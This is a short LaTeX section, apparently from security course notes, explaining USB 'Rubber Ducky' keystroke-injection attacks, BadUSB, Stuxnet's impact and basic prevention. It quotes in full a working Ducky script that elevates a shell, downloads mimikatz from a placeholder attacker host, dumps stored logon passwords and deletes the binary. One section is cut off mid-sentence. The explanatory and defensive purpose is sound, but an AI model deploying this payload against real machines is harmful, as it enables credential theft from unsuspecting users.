\section{"Rubber Ducky" attack}
A "Rubber Ducky" attack is neither a client or server side attack and instead is a physical attack that preys on either a person's curiosity or a person's lack of knowledge. The basis for the attack is either an infected USB thumbdrive or a specifically created USB drive. 

\subsection{Designed devices}
There are commercially created devices that are used to execute this type of attack. A common one is the Hakshop USB Rubber Ducky. It is created to make writing the attack as simple as possible so the barrier of entry is lowered. They also have a github repository that has premade attacks (https://github.com/hak5darren/USB-Rubber-Ducky). \\
\\
\begin{verbatim}
REM mimikatz ducky script to dump local wdigest passwords from memory using mimikatz (local user needs to be an administrator/have admin privs)
DELAY 3000
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 300
ENTER
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<replace me with webserver ip/host>/mimikatz.exe','%TEMP%\mimikatz.exe')
DELAY 300
ENTER
DELAY 3000
STRING %TEMP%\mimikatz.exe
DELAY 300
ENTER
DELAY 3000
STRING privilege::debug
DELAY 300
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
DELAY 300
ENTER
DELAY 1000
STRING exit
DELAY 300
ENTER
DELAY 100
STRING del %TEMP%\mimikatz.exe
DELAY 300
ENTER
\end{verbatim}
This attack is from the payload wiki that is created for the hakshop device. It uses mimikatz and the elevated privages of a user to dump their passwords from digest. \\
\\

subsection{Infected USB Devices}
"BadUSB" is research on different USB devices that can be converted to execute these style of attacks named. These attacks require the creator to reprogram the firmware of a device. This attack is not limited to USB thumbdrive type devices.There is a list of devices that have been researched at https://opensource.srlabs.de/projects/badusb.  

subsection{HID creation}
The social engineering toolkit also 
\subsection{Impact}
This attack requires that the attacker have more knowledge on the physical operations of a target. On a successful attack this increases the payoff. An example of this being sucessful is the Stuxnet attack on Iran. The attack was able to cross into an air gaped, not accessable from the internet, system and destroy centerfuges because the payload was designed to target the industrial control systems that the centerfuges used. This is an extreme example but these styles of attacks have been used by nation's to protect their self interest.

\subsection{Prevention}
Preventing the lower level versions of these attacks are simple. Don't let regular users have local admin. Blacklist USB devices and don't allow automatic installation.\\
For the higher value targets that require zero-day exploits there isn't much of a defence because they are by definiton an unknown attack. The mitigation on these is to design a system where there isn't a single point that cause cause systemic damage.  
